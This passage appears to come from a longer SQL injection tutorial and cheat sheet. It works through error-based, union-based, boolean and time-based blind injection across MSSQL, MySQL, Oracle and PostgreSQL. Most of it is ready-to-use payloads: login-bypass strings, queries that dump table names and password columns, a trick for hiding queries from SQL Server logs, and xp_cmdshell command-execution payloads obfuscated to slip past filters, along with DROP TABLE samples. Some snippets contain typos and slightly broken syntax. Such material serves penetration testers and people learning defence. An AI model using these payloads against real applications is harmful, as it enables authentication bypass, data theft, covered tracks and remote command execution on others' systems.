`SELECT username,password FROM users WHERE username='$INPUT1$' AND password='$INPUT2$';`

Where $INPUT1$ and $INPUT2$ are taken from the user of the application.

Basically our above query is checking if the user input values are present inside the database or not.

let's assume `$INPUT$` = `test` and `$INPUT2` = `testpass`

our payload: `test' OR 1=1 --`

For better understanding let's break down the payload and insert it into the query.

```query
SELECT username,password FROM users WHERE username='test' OR 1=1 --' AND password='testpass';
```

Payload Breakdown:

`test'` : it is breaking out the `''` in the query.

`OR` : OR becomes true whenever we have atleast one condition true.

`1=1` : for making our whole query always true we are using `1=1` that is always true.

`--` : As we have saw earlier `--` comments out the rest of the query that means password check is "commented out" so that it has no effect.

So ultimately the attacker has altered the logic of the statement and that could bypass authentication cause the database to leak confidential information or even execute functions such as executing operating system commands.

### Detecting Vulnerable Functions

Consider the following query which loads a news article from the database to display on an fictitious web application:

`SELECT id,title,content FROM tblArticles WHERE id=$input`

A effective way to do detect vulnerable functions is to generate an error or to alter the query in such a way that we have successfully injected into SQL and possibly see a visible result. e.g. SQL-like syntax being parsed in the expected way.
when we pass `'` as an input the website will return an error. if we got an error we have to confirm it that it is due to `'` and we can confirm it by few ways.

* `--'` : this will tell the database ignore everything after the `--` .

* If the user input is integer we can try to subtract it with some number and if that works that means we have an sqli.

  For example:

  `http://sql.example.org/news?id=100`

   Now let's subtract 1 from 100.

  `http://sql.example.org/news?id=100-1`

   and if we got `id=99` that means we have an sqli.

* What if we have a string instead of a integer?

  For Example:

  `http://sql.example.org/news?page=example`

With the above case it’s possible to utilize string concatenation in a similar way, where if the string is evaluated and concatenated then the output should not change whereas if it is no evaluated then a noticeable change in output will occur. The method of concatenation differs between back-end database types however if one works you have the added benefit of fingerprinting the database type!.

#### MSSQL

```mssql
exa'+'mple
With URLs a + is space, use %2b instead (URI encoded plus sign)!
```

#### MySQL

```mysql
exa' 'mple (that's a space between two apostrophes)
```

#### Oracle

```oracle
exa'||'mple
```

Another way of detecting the vulnerability is to concatenate a simple conditional at the end of the input, such as:

```ex
AND 1=1 -- (This will get evaluated as True as 1=1)
AND 1=2 -- (This will get evaluated as False as 1 is not equal to 2)
```

Awesome now we have learned lots of tricks but what if `'` is not allowed ? In that case we can use comparisons between valid and invalid system variables. Let's see the example:

```ex
AND (SELECT @@version)=(SELECT @@version) -- 

AND SLEEEP(5)=SLEEP(5) --
```

First one is valid but is invalid because `SLEEEP` is not equal to `SLEEP` .

### Bypassing Login Screens (SMO+)

#### SQL Injection 101, Login tricks

```tricks
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
' or 1=1 limit 1 -- -+
'="or'
admin' or 2 LIKE 2--
```

#### Login as different user (SM)

```tricks
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--

Note: *Old versions of MySQL doesn't support union queries
```

#### Bypassing second MD5 hash check login screens

If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.

#### Example

```trick
Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password : 1234
81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
```

### Types Of Injections

SQL Injection can be classified into 3 main categories :

1. In band SQLi

2. Inferential SQLi

3. Out of band SQLi

#### In Band SQLi

In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results also this is easy to exploit and very common attack.
In Band SQLi is sub divided into 2 parts :

1. Error based SQLi
2. Union based SQLi

#### Error Based

Error-based SQL injection comes about when errors from the SQL database are exposed to the attacker by being embedded in application responses.

Example:

```ex
https://sql.exmaple.com/gallery.php?id=4'
```

In the above example we placed `'` and if database throws an SQL error we can confirm that it is vulnerable.

The exact error depends on the backend database. These errors can be controlled and by crafting input you can cause the error to contain data from the database itself. For example, if you are injecting into an integer input you can cause a type clash which will disclose information like this:

```ex
https://sql.exmaple.com/gallery.php?id=4 AND 1 in (SELECT @@version)
```

with input like this you’ll get an error along the following lines:

```ex
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2008 R2 (SP1) - 10.50.2500.0 (X64) Jun 17 2021 00:54:03 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: ) (Hypervisor)' to data type int
```

This works as the database attempts to convert the string to an integer, cannot, and throws an error that reveals the information.

Interesting right? Let's take another example:

site

```site
http://widgetshop.com/widget/?id=1
```

and we try with

```ex
http://widgetshop.com/widget/?id=1 or x=1
```

and it gives us an error

```ex
Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'x'
```

We can possibly extract table names and other details with this

```extract
http://widgetshop.com/widget/?id=convert(int,(select top 1 name from sysobjects where id=(select top 1 id from (select top 1 id from sysobjects where xtype='u' order by id) sq order by id DESC)))
```

we get the error

```error
System.Data.SqlClient.SqlException: Conversion failed when converting the varchar value "TableName" to data type int.
```

Let’s deconstruct the query from the URL:

```decon
convert(int, (
   select top 1 name from sysobjects where id=(
     select top 1 id from (
       select top 1 id from sysobjects where xtype='u' order by id
     ) sq order by id DESC
   )
  )
 )
 ```

1. Working from the deepest nesting up, get the first record ID from the sysobjects table after ordering by ID.
2. From that collection, get the last ID (this is why it orders in descending) and pass that into the top select statement.
3. That top statement is then only going to take the table name and try to convert it to an integer.
4. The conversion to integer will almost certainly fail (please people, don’t name your tables “1” or “2” or any other integer for that matter!) and that exception then discloses the table name in the UI.

#### Union Based SQLi

Before understanding the exploitation part let's understand `Union` Clause.

The UNION operator is basically used to combine the results of two or more SELECT statements.

For using `UNION` each `SELECT` statement must have:

1. The same number of columns.

2. Similar data types.

3. The columns in each `SELECT` statement must also be in the same order.

Syntax:

```syntax
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2; 
```

Now let's move on to Exploitation part :)

How to find number of columns using `UNION` ?

Use `NULLs` in place of the columns to determine how many columns there are, such as:

```null
UNION SELECT NULL --
UNION SELECT NULL, NULL --
UNION SELECT NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL --
```

and continue until you’ve determined how many columns there are – if you get the incorrect number of columns an error condition will occur and if you get the right number then the application will run unhindered. You can then swap out the NULL with datatypes to determine which ones are correct, such as:

```ex
UNION SELECT 'abcd', NULL, NULL, NULL --
UNION SELECT 1, NULL, NULL, NULL --
```

Work them out one at a time until you end up with something like this:

```ex
UNION SELECT 1, 'string', 'string', 'string' --
```

At this point you have a working SELECT statement where the output will be appended to the normal output the application gives!

If you’ve got a lot of columns and writing out all of those NULLs is too much like hard work.

Or we can also do this method too:

```another
site.com/cat.php?id=1 union 1 (error)
site.com/cat.php?id=1 union 1,2 (error)
site.com/cat.php?id=1 union 1,2,3 (error)
site.com/cat.php?id=1 union 1,2,3,4 (no error)
```

So we can conclude that there are 4 columns present in the database.

Alright, we got number of columns now we have to find vulnerable column.

Now, we have to check which column value is reflecting on the page let's see an example.

```ex
site.com/cat.php?id=1 union 1,2,3,4 (no error)
```

let's assume `2` is relecting on the page that means second column is vulnerable.

so we will replace "2" with the version

`site.com/cat.php?id=2 union select 1,@@version,3,4`

and we will get the version of the server let's exploit it more ;)

`cat.php?id=2 union select 1,user(),3,4`

Now we will dump the database:

`site.com/cat.php?id=2 union select 1,table_name,3,4 from information_Schema.tables`

Now we dump the columns:

`site.com/cat.php?id=2 union select 1,column_name,3,4 from information_Schema.columns`

Now the we will retrieve the columns:

`site.com/cat.php?id=2 union select 1,password,3,4 from users`

after that we can either get credentials in plain text or in hashed form so for that we can use john the ripper, hashcat or [crackstation](https://crackstation.net/)

There's Another way finding number of columns:

ORDER BY:

`site.com/cat.php?id=1 order by 10 --`

The thing is it will show error when the column number is high for example if we have 4 columns so it will show error upto 5

```ex
site.com/cat.php?id=1 order by 5 -- (error)
site.com/cat.php?id=1 order by 4 -- (no error)
```

So by that we can detect the number of columns.

#### Hints

1. Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.

2. To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.

3. Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc. * Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field).

#### Finding Column Type

```ex
' union select sum(columntofind) from users-- (S)
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.
```

If you are not getting an error it means column is numeric.

Also you can use CAST() or CONVERT()

```ex
SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--
```

Other

```other
11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-    - No Error - Syntax is right. MS SQL Server Used. Proceeding.
11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-       - No Error – First column is an integer.
11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --          - Error!   – Second column is not an integer.
11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-        - No Error – Second column is a string.
11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-           - Error!   – Third column is not an integer. ...
```

Other2

```other2
Microsoft OLE DB Provider for SQL Server error '80040e07'
Explicit conversion from data type int to image is not allowed.
```

We'll get convert() errors before union target errors ! So start with convert() then union

#### Inferential SQLi (Blind SQLi)

About Blind SQL Injections

In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.

1. Normal Blind: You can not see a response in the page, but you can still determine result of a query from response or HTTP status code.
2. Totally Blind: You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.

In normal blinds you can use if statements or abuse WHERE query in injection (generally easier).

In totally blinds you need to use some waiting functions and analyze response times. For this you can use `WAIT FOR DELAY` '0:0:10' in SQL Server, BENCHMARK() and `sleep(10)` in MySQL, `pg_sleep(10)` in PostgreSQL, and some PL/SQL tricks in ORACLE.

Types:

1. Blind-boolean-based SQLi
2. Blind-time-based SQLi

Let's learn both of them one by one.

#### Blind Boolean

If the application gracefully errors, and it’s not possible to combine queries with UNION, then an attacker can use inference to determine the answer to queries about the database. The payloads we used earlier to prove the existence of injection are simple examples of this:

```and
AND 1=2 --
AND 1=1 --
```

Essentially these are asking yes or no questions of the database and the result shows the answer.

1. "Does 1=1"? Yes of course it does and therefore the normal output of the application will be visible.

2. “Does 1=2"? No it does not and therefore there should be a noticeable chance, this could be in the response length, time of execution, or HTTP response code.

However we can expand up on this idea to ask more in-depth questions of the database, as long as we can phrase them as Yes/ No questions. For example, “Is the first letter of the current user the letter ‘a'”? That’d look something like:

```sub
AND SUBSTR(SELECT user_name(), 1, 1)='a' --
```

We can cycle through: b, c, d, e until we get a “true” response – then move on to the second character and so on. A time consuming and request intensive process but it can be automated quite easily with python (or Burp Intruder!)

The above check of

```and
AND 1=1 --
```

```ex
id = 5 'or 1 = (select db_name ()) - => The name of the Database of the current user.
can also be made by using

id = 5 'or 1 = (select system_user) - => The name of the owner of the given database.
id = 5 'and len (@@ version) = len (@@ version) - => true
id = 5 'and (@@ TEXTSIZE> @@ LANGID) - => true
```

For Example:

```ex
http://bounty/yadayada.asp?id=8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 --> page will be loaded normally.
http://bounty/yadayada.asp?id=8888'+AND+(@@LANGID>@@TEXTSIZE)+'1'+LIKE+'1 --> page will be blank
```

What we are trying to do is run a existing Transact-SQL inside a MSSQL where its return types is either integer or smallint. And usually, these return types already have their own value.

Such as an example:

```ex
@@LANGID usually will be 0 for default (English language)
@@TEXTSIZE can be bigger than 1000
```

If Statements

Get response based on a if statement. This is one of the key points of Blind SQL Injection, also can be very useful to test simple stuff blindly and accurately. If statements of

MySQL

```mysql
IF(condition,true-part,false-part) (M)
SELECT IF(1=1,'true','false')
```

SQL Server

```sql
IF condition true-part ELSE false-part (S)
IF (1=1) SELECT 'true' ELSE SELECT 'false'
```

Oracle

```oracle
BEGIN
IF condition THEN true-part; ELSE false-part; END IF; END; (O)
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
```

PostgreSQL

```post
SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P)
SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;
```

If Statement SQL Injection Attack Samples

if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S)

This will throw an divide by zero error if current logged user is not "sa" or "dbo"

Examples:

These tests are simply good for blind sql injection and silent attacks.

```ex
    product.asp?id=4 (SMO)

    product.asp?id=5-1
    product.asp?id=4 OR 1=1
```

product.asp?name=Book

```ex
    product.asp?name=Bo'%2b'ok
    product.asp?name=Bo' || 'ok (OM)
    product.asp?name=Book' OR 'x'='x
```

Example:

```ex
http://widgetshop.com/widget/?id=1 and 1=2
```

Firstly, it might just throw an exception if no record is returned. Secondly, the app might not throw an exception but then it also won’t display a record either because the equivalency is false.

Now let’s try

```ex
1 and
(
 select top 1 substring(name, 1, 1) from sysobjects where id=(
     select top 1 id from (
           select top 1 id from sysobjects where xtype='u' order by id
       ) sq order by id desc
      )
 ) = 'a'
```

It’s now an equivalency test to see if the first character of the table name is an “a” (we’re assuming a case-insensitive collation here). If this request gives us the same result as “?id=1” then it confirms that the first table in sysobjects does indeed begin with an “a” as the equivalency has held true. If it gives us one of the earlier mentioned two scenarios (an error or shows no record), then we know that the table doesn’t begin with an “a” as no record has been returned.

Now all of that only gives us the first character of the table name from sysobjects, when you want the second character then the substring statement needs to progress to the next position:

```ex
select top 1 substring(name, 2, 1) from sysobjects where id=(
```

We can see it now starts at position 2 rather than position 1. Of course this is laborious; as well as enumerating through all the tables in sysobjects you end up enumerating through all the possible letters of the alphabet until you get a hit then you have to repeat the process for each character of the table name.

A better way to this would be:

```better
1 and
(
 select top 1 ascii(lower(substring(name, 1, 1))) from sysobjects where id=(
     select top 1 id from (
           select top 1 id from sysobjects where xtype='u' order by id
     ) sq order by id desc
   )
 ) > 109
```

Difference here in that what’s it doing is rather than checking for an individual character match, it’s looking for where that character falls in the ASCII table. Actually, it’s first lowercasing the table name to ensure we’re only dealing with 26 characters (assuming alpha-only naming, of course), then it’s taking the ASCII value of that character. In the example above, it then checks to see if the character is further down the table than the letter “m” (ASCII 109) and then of course the same potential outcomes as described earlier apply (either a record comes back or it doesn’t).

The main difference is that rather than potentially making 26 attempts at guessing the character (and consequently making 26 HTTP requests), it’s now going to exhaust all possibilities in only 5 – you just keep halving the possible ASCII character range until there’s only one possibility remaining.

For example, if greater than 109 then it must be between “n” and “z” so you split that (roughly) in half and go greater than 115. If that’s false then it must be between “n” and “s” so you split that bang in half and go greater than 112. That’s true so there’s only three chars left which you can narrow down to one in a max of two guesses. Bottom line is that the max of 26 guesses (call it average of 13) is now done in only 5 as you simply just keep halving the result set.

Another example from [Exploiting(pretty) blind SQL injection](https://isc.sans.edu/diary/Exploiting+%28pretty%29+blind+SQL+injections/20733).

SQL query through a request:

```request
http://10.10.10.10/application.aspx?queueID=743994
```

When the URL was opened regularly, in a browser, it was supposed to list certain transactions belonging to the numerical queueID in shown in the URL. The first issue was that the queueID we had to work with had no results! It just returned an empty page (and there was no Direct Object Reference here, we had to use that particular queueID).

Putting 743994 OR 1=1 or a UNION didn’t work either – the application expected exactly certain values in the columns (not only column types) and all we could get with both of these cases was a nice, generic error screen.

So, to prove that there was a SQL injection vulnerability, the following two queries can satisfy our needs:

```queue
queueID = 743994 AND 1=1
queueID = 743994 AND 1=2
queueID = 743995
queueID = 743994’
```

The first 3 queries all return a no results page. The last one returns the generic error page due to the SQL error that happened in the background. As with any blind SQL injection vulnerability, we need a true/false cases. The true case can be the no results page, while the false case can be the error page. The only question that remains is how to provoke the error page – it’s easy to do manually by entering a ‘ character, but how to do it in SQL, programmatically? Division by zero come to the rescue! If we divide something by zero, we can cause an SQL error, which will result with the generic error page.

Our exploitation now becomes the following:

```exploit
queueID = 743994 AND 1 = 1 / (select case when substr(banner, 1, 1) = 'A' then 1 else 0 end from (select banner from v$version where banner like '%Oracle%'))
```

The query takes the database banner from v$version (where it has string Oracle in it). Then, from that line the first character is examined (specified by the substr() call) and compared to the letter 'A'. If it is 'A', the query returns 1, otherwise it returns 0. This will either result in 1 = 1 / 1 or 1 = 1 / 0. The former will display the no results page while the latter will display the error page.

Another example from [Advanced Blind SQL Injection - Oracle](https://isc.sans.edu/diary/Advanced+blind+SQL+injection+%28with+Oracle+examples%29/6409)

#### Environment

In our test environment, the developer receives one parameter. We'll call it event and it can have two possible values, true or false. When called, it is used like this:

```ex
http://10.10.10.10/application.php?event=true
or
http://10.10.10.10/application.php?event=false
```

However, depending on the parameter (true or false or something else), the application will have different output and that allows us to see what's going on behind. In other words, if the parameter is "true" the output will be different from the case when the parameter is "abcd" (or "false"). And this is the basis of blind SQL injection – we want to make a difference between various SQL statements which will allow us to deduce the content of the database.

In typical blind SQL injection examples a timed delay is added to the attacker observes how long it takes for the query to execute. In this case it was not possible because we were dealing with stored procedures and some web application firewalls which prevented from using UNION statements.

#### Exploitation

As we don't know how exactly the stored procedure is called or what's the backend database, the easiest way to determine that is to split the input parameter:

```query
event = tr' || 'ue
```

This will cause the final input parameter to be 'tr' || 'ue' – the || operator in Oracle means concatenate so the parameter will actually be "true".

This shows that the database is evaluating the SQL statement which allows us to enter some if/then cases that will, in the end, allow us to read data from the database. So let's see how this is done in a bit more complex query:

```query
event = tr' || (select case when substr(banner, 1, 1) = 'A' then 'u' else 'X' end from (select banner from v$version where banner like '%Oracle%')) || 'e
```

1. The query takes the database banner from v$version (where it has string Oracle in it).
2. Then, from that line the first character is examined (specified by the substr() call) and compared to the letter 'A'.
3. If it is 'A', the query returns 'u', otherwise it returns 'X'.
4. Finally, this is concatenated so we have the following if/then case:

```if
If first character of the banner line containing string Oracle is 'A' return 'u' so the final string will be 'true'.
Otherwise, return 'X' so the final string will be 'trXe'.
```

Now, by examining the output of the application, it is possible to deduce if the query was successful or not.

Oracle has a handy table called all_sources which contains sources of stored procedures and functions. This may allow to retrieve source code!

SubstringToCharacterConversionToIncrementationOrDecrementationToCharacterConversionToStringConcatenation!!!!!!!

This might be useful in some scenarios

```substring
SUBSTRING(<thing>,X,1)
```

and then convert that to its numeric ASCII value:

```ascii
ASCII( SUBSTRING(<thing>,X,1) )
```

and then either increment or decrement that numeric value to the ASCII value of a character to get a result from:

```ascii
ASCII( SUBSTRING(<thing>,X,1) ) +/- Y
```

and then take that numeric ASCII value and convert THAT back to a character:

```char
CHAR( ASCII( SUBSTRING(<thing>,X,1) ) +/- Y )
```

and then perform string concatenation on that entire thing:

```concat
"We' + CHAR( ASCII( SUBSTRING(<thing>,X,1) ) +/- Y ) + 'dy"
```

and then see if I get "Wendy" back as search result or nothing at all.

#### Time-Based Blind

If the application does not embed responses so you can’t use UNION, if it doesn’t show error messages an it’s not possible to determine the output of a boolean then there is still hope! If you can’t infer the output to a boolean through application responses you can add a notable difference yourself through time delays.

Effectively using IF statements and delays you can ask the application “Does A=A? If so, please delay your response by five seconds and if not then immediately respond”. Then by detecting lag in the response you’ll get your answer! Simple…but very time consuming… A payload like this will work for MSSQL:

```ex
IF('a'='a') WAITFOR DELAY '0:0:5' --
```

Then you can simply replace the ‘a’=’a’ with whatever yes/no question it was that you’d like to ask.

#### WAIT FOR DELAY 'time' (S)

This is just like sleep, wait for specified time. CPU safe way to make database wait.

```ex
WAITFOR DELAY '0:0:10'--
```

Also, you can use fractions like this,

```ex
WAITFOR DELAY '0:0:0.51'
```

Real World Samples

```ex
Are we 'sa' ?
if (select user) = 'sa' waitfor delay '0:0:10'
```

ProductID

```prodid
ProductID = 1;waitfor delay '0:0:10'--
ProductID =1);waitfor delay '0:0:10'--
ProductID =1';waitfor delay '0:0:10'--
ProductID =1');waitfor delay '0:0:10'--
ProductID =1));waitfor delay '0:0:10'--
ProductID =1'));waitfor delay '0:0:10'--
```

BENCHMARK() (M)

Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!

```benchmark
BENCHMARK(howmanytimes, do this)
```

Real World Samples

```ex
Are we root ? woot!
IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))
Check Table exist in MySQL
IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
```

-> pg_sleep(seconds) (P) : Sleep for supplied seconds.

```pgsleep
SELECT pg_sleep(10); Sleep 10 seconds.
```

-> sleep(seconds) (M) : Sleep for supplied seconds.

```sleep
SELECT sleep(10); Sleep 10 seconds.
```

-> dbms_pipe.receive_message (O) : Sleep for supplied seconds.

```dbmspipe
(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
{INJECTION} = You want to run the query.
```

If the condition is true, will response after 10 seconds. If is false, will be delayed for one second.

Example:

Let's say the query is

```query
http://widgetshop.com/Widgets/?OrderBy=Name
```

which would be

```query
SELECT * FROM Widget ORDER BY Name
```

If stacked queries are enabled, may we can do

```ex
Name;
IF(EXISTS(
  select top 1 * from sysobjects where id=(
    select top 1 id from (
      select top 1 id from sysobjects where xtype='u' order by id
    ) sq order by id desc
  ) and ascii(lower(substring(name, 1, 1))) > 109
 ))
 WAITFOR DELAY '0:0:5'
 ```

 Statement that looks for the presence of a table at the end of sysobjects beginning with a letter greater than “m” and if it exists, the query then takes a little nap for 5 seconds.

### Covering Your Tracks

#### SQL Server -sp_password log bypass (S)

SQL Server don't log queries that includes sp_password for security reasons(!). So if you add

```sppasss
--sp_password
```

to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible).

### Database Structure Queries

#### SQL Server (S)

Getting User defined Tables

```userdefined
SELECT name FROM sysobjects WHERE xtype = 'U'
```

Sysobjects table is the one that lists all the objects in the database and in our case we’re filtering that list by xtype “u” or user tables.

Getting Column Names

```colname
SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
```

#### MySQL (M)

Getting User defined Tables

```userdefined
SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'
```

Getting Column Names

```colnames
SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'
```

#### Oracle (O)

Getting User defined Tables

```userdefined
SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'
```

Getting Column Names

```colnames
SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'
```

### Other Stuff

#### Line Comments

Comments out rest of the query. Line comments are generally useful for ignoring rest of the query so you don't have to deal with fixing the syntax.

(SM) --

```ex
    DROP sampletable;--
```

(M) #

```M
    DROP sampletable;#
```

Line Comments Sample SQL Injection Attacks

Username

```comments
    Username: admin'--
```

```comments
    SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
```

This is going to log you as admin user, because rest of the SQL query will be ignored.

#### Inline Comments

Comments out rest of the query by not closing them or you can use for bypassing blacklisting, removing spaces, obfuscating and determining database versions.

/* Comment Here */ (SM)

```comment
DROP/*comment*/sampletable
DR/**/OP/*bypass blacklisting*/sampletable
SELECT/*avoid-spaces*/password/**/FROM/**/Members
```

* /*! MYSQL Special SQL */ (M) :

This is a special comment syntax for MySQL. It's perfect for detecting MySQL version. If you put a code into this comments it's going to execute in MySQL only. Also you can use this to execute some code only if the server is higher than supplied version.

```ex
    SELECT /*!32302 1/0, */ 1 FROM tablename
```

* Classical Inline Comment SQL Injection Attack Samples

```classical
ID: 10; DROP TABLE members /* Simply get rid of other stuff at the end the of query. Same as 10; DROP TABLE members --
SELECT /\*!32302 1/0, \*/ 1 FROM tablename Will throw an divison by 0 error if MySQL version is higher than3.23.02
```

#### Stacking Queries

Executing more than one query in one transaction. This is very useful in every injection point, especially in SQL Server back ended applications.

```stacking
; (S)

SELECT * FROM members; DROP members-- : Ends a query and starts a new one.
```

#### Using Integers

Very useful for bypassing, magic_quotes() and similar filters, or even WAFs.

```sm
0xHEXNUMBER (SM)
```

We can write hex like these;

```hex
SELECT CHAR(0x66) (S)
SELECT 0x5045 (this is not an integer it will be a string from Hex) (M)
SELECT 0x50 + 0x45 (this is integer now!) (M)
```

#### String Operations

String related operations. These can be quite useful to build up injections which are not using any quotes, bypass any other black listing or determine back end database.

String Concatenation

* (S)

```ex
    SELECT login + '-' + password FROM members
```

* || (*MO)

```ex
SELECT login || '-' || password FROM members
```

About MySQL "||"

If MySQL is running in ANSI mode it's going to work but otherwise MySQL accept it as logical operator it'll return 0. A better way to do it is using CONCAT() function in MySQL.

* CONCAT(str1, str2, str3, ...) (M) : Concatenate supplied strings.

```concat
    SELECT CONCAT(login, password) FROM members
```

#### Strings without Quotes

These are some direct ways to using strings but it's always possible to use CHAR()(MS) and CONCAT()(M) to generate string without quotes.

* 0x457578 (M) - Hex Representation of string

```hex
    SELECT 0x457578
```

This will be selected as string in MySQL.

In MySQL easy way to generate hex representations of strings use this;

```concat
    SELECT CONCAT('0x',HEX('c:\\boot.ini'))
```

* Using CONCAT() in MySQL
  
```concat
    SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)
```

This will return 'KLM'.

* Using CHAR()

```char
SELECT CHAR(75)+CHAR(76)+CHAR(77) (S)     This will return 'KLM'.
SELECT CHR(75)||CHR(76)||CHR(77) (O)      This will return 'KLM'.
SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (P) This will return 'KLM'.
```

#### Hex based SQL Injection Samples

```hex
SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M) This will show the content of c:\boot.ini
```

String Modification & Related

* ASCII() (SMP) Returns ASCII character value of leftmost character. A must have function for Blind SQL Injections.

```ascii
    SELECT ASCII('a')
```

* CHAR() (SM) Convert an integer of ASCII.

```char
    SELECT CHAR(64)
```

### Filter Evasion

Scott Sutherland has written [SQL Injection: Death by Blacklist](https://blog.netspi.com/sql-injection-death-by-blacklist/).

* Standard SQL injection query using xp_cmdshell.

```xpcmdshell
    ‘;exec xp_cmdshell ‘dir’;–
```

* Using the escape character to bypass filters that replace ‘ with ‘ ‘.

```escape
    ‘;exec xp_cmdshell ‘dir’;–
```

* Using upper and lower characters to bypass filters that are case sensitive. Note: The filtering may be case sensitive, but most SQL Server commands are not.

```upperlower
    ‘;exec xP_cMdsheLL ‘dir’;–
```

* Using comments to avoid xp_cmdshell detection. Note: This method doesn’t work in SQL Server versions after 2000.

```comments  
    ‘;ex/**/ec xp_cmds/**/hell ‘dir’;–
```

* Using comments to avoid spaces. Note: This works with all versions of SQL Server.

```comments
    ‘;exec/**/xp_cmdshell/**/’dir’;–
```

* Using concatenation to avoid xp_cmdshell detection.

```concatenation
‘;Declare @cmd as varchar(3000);Set @cmd = ‘x’+’p’+’_’+’c’+’m’+’d’+’s’+’h’+’e’+’l’+’l’+’/**/’+””+’d’+’i’+’r’+””;exec(@cmd);–
```

* Using Base64 encoding to avoid xp_cmdshell detection.

```base64
‘;DECLARE @data varchar(max), @XmlData xml;SET @data = ‘ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn’;SET @XmlData = CAST(‘‘ + @data + ‘‘ as xml);SET @data = CONVERT(varchar(max), @XmlData.value(‘(data)[1]’, ‘varbinary(max)’));exec (@data);–
```

* Using char function encoding to avoid xp_cmdshell detection. Note: Encoding of characters can be done with the SELECT ASCII(‘T’) query.

```char
Declare @cmd as varchar(3000);Set @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd);–
```

* Using Unicode nchar function encoding to avoid xp_cmdshell detection. Note: Unicode character encoding can be done with the SELECT UNICODE(‘a’); query.

```unicode
Declare @cmd as nvarchar(3000);Set @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+nchar(101)+nchar(114)+nchar(46)+nchar(46)+nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)+nchar(100)+nchar(115)+nchar(104)+nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)+nchar(105)+nchar(114)+nchar(39)+nchar(59));EXEC(@cmd);–
```

* Using binary encoded ascii, and the CAST function to avoid xp_cmdshell detection. Note: Binary encoding can be done with the SELECT CAST(‘query’ as binary); query.

```ex
‘;Declare @cmd as varchar(3000);Set @cmd = Ncast(0x78705F636D647368656C6C202764697227 as varchar(3000));exec(@cmd);–
```

* Using binary encoded ascii, and the CONVERT function to avoid xp_cmdshell and CAST detection. Note: Binary encoding can be done with the SELECT CONVERT (binary,’query’ ); query.

```ex
‘;Declare @cmd as varchar(3000);Set @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec(@cmd);–
```

